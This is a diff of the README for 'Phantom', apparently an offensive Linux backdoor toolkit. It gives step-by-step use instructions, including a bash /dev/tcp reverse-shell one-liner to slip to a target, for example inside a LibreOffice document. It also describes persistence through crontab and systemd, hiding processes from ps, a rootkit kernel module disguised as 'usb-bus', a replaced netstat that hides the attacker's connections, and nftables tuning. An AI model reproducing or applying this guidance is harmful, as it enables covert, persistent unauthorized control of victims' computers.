@@ -1,26 +1,41 @@
-Phantom is a tool which creates backdoor shells from a target machine to a predifined ip:port (your machine) and hides their pid, persisting through reboots.
-It also hides the files needed to perform the above and replaces netstat.
+Phantom is a tool which creates backdoor shells from a target machine to a predifined ip:port (your machine) and hides their 
+pid, persisting through reboots. It also hides the files needed to perform the above and replaces netstat.
 
 **Phantom uses nftables and ncat.**
 
 ---Usage---
 
-The first thing you have to do is to somehow make the target execute this code (for example by injecting it to a libre office writer document): bash -c "bash &>/dev/tcp/ip/port  0>&1 &"
-You have to replace ip and port with that in the phantom-init file.
+The first thing you have to do is to somehow make the target execute this code (for example, by injecting it to a Libre 
+Office Writer document): bash -c "bash &>/dev/tcp/ip/port  0>&1 &". ip and port are the ones in the phantom-init file.
 
-phantom-init: Opens an ncat listening process to a predefined ip and port and redirects input to the phantom file. Change the ip and port to yours and also the location of the phantom file.
-phantom: This is the file that gets executed when the target connects to the listening ncat port, as specified in the phantom-init file. It does the following:
-	a) If the user connecting is not root it erases the existing crontab entry for the user and adds a crontab entry for the user which periodically attempts to create a backdoor shell. The port
-	of the backdoor shell is not the one specified in phantom-init but another one. The reason for this is that this way you have more control of what to do with the backdoor shell, otherwise 
-	the same script (phantom) gets executed each time the target connects to your machine. The above means that you have to open ncat a second time, listening to a different port.
-	b) If the user connecting is root it creates a systemd service which executes a script, continuously trying to create a backdoor bash shell to your machine (again, not at the same port of the 	phantom-init file). It also creates a systemd service which executes a script, hiding the pids of the backdoor shells and both of the systemd services (ps aux cannot find them this way). Finally, 		it creates and inserts a rootkit module named usb-bus which hides its files, the ones of the scripts that the systemd services use and the systemd services themselves. It is also persistent 
-	through reboots because the second systemd service (the one which hides pids) inserts it when it loads at boot time.
-phantom-firewall: This file modifies nftables rules so that it doesn't allow more than one connection from a target ip. This is good because otherwise, the crontab entry is gonna open continuously
-	new bash shells, increasing the footprint of Phantom actions and putting increasing and uneeded load on the target system.
+phantom-init: Opens an ncat listening process to a predefined ip and port and redirects input to the phantom file. Change 
+the ip and port and also the location of the phantom file.
+
+phantom: This is the file that gets executed when the target connects to the listening ncat port, as specified in the 
+phantom-init file. It does the following:
+	a) If the user connecting is not root it erases the existing crontab entry for the user and adds a crontab entry 
+	for the user which periodically attempts to create a backdoor shell. The port of the backdoor shell is not the one
+	specified in phantom-init but another one. The reason for this is that this way you have more control of what to do 
+	with the backdoor shell, otherwise the same script (phantom) gets executed each time the target connects to your 
+	machine. The above means that you have to open ncat a second time, listening to a different port. You have to 
+	specify the second ncat ip and port in the phantom file, following the instructions there.
+	b) If the user connecting is root it creates a systemd service which executes a script, continuously trying to 
+	create a backdoor bash shell to your machine (again, not at the same port of the phantom-init file). It also creates 
+	a systemd service which executes a script, hiding the pids of the backdoor shells and both of the systemd services 
+	(ps aux cannot find them this way). It then creates and inserts a rootkit module named usb-bus which hides its files, 
+	the ones of the scripts that the systemd services use and the systemd services themselves. It is also persistent 
+	through reboots because the second systemd service (the one which hides pids) inserts it when it loads at boot time. 
+	Then, it replaces netstat with a version that hides the remote connections to the specified ip and port.
+
+phantom-firewall: This file modifies nftables rules so that it doesn't allow more than one connection from a target ip. This 
+is good because otherwise, the crontab entry is gonna open continuously new bash shells, increasing the footprint of Phantom
+actions and putting increasing and uneeded load on the target system. You also have to change the ip and port in this file.
 
 Order of execution:
-1. Execute phantom-firewall as root, so it can modify the firewall rules. (Change the ip and port that the script uses according to the ones that ncat uses.)
-2. Create an ncat listening process at a port different from the one specified in the phantom-init file. This is where all the backdoor shells will go. There is some procedure involved in doing so:
+1. Execute phantom-firewall as root, so it can modify the firewall rules. (Change the ip and port that the script uses 
+according to the ones that ncat uses.)
+2. Create an ncat listening process at a port different from the one specified in the phantom-init file. This is where all 
+the backdoor shells will go. There is some procedure involved in doing so:
 	a) Open the phantom file.
 	b) Change the ip variable according to the ncat ip and port.
 	c) Follow the instructions in the _hiding variable to change the ip and port there.
@@ -30,8 +45,9 @@ Order of closing:
 1. You can close phantom-init any time you want, it doesn't matter.
 2. Close phantom-firewall and wait for some seconds so the connections can start flowing normally again.
 3. Close the ncat listening process so all the connections get closed with it.
-4: Execute the commands as root: nft flush table PHANTOM, nft list ruleset >/etc/nftables.conf, systemctl restart nftables. That undoes any changes to the nftables made by phantom-firewall. This is needed
-because if you want to open ncat again the target is gonna be able to connect to you again, otherwise a nftables rule is gonna block him.
+4: Execute the commands as root: nft flush table PHANTOM, nft list ruleset >/etc/nftables.conf, systemctl restart nftables. 
+That undoes any changes to the nftables made by phantom-firewall. This is needed if you want to open ncat again and the 
+target to be able to connect to you again, otherwise a nftables rule is gonna block him.
 
 ---Contact Information---
 
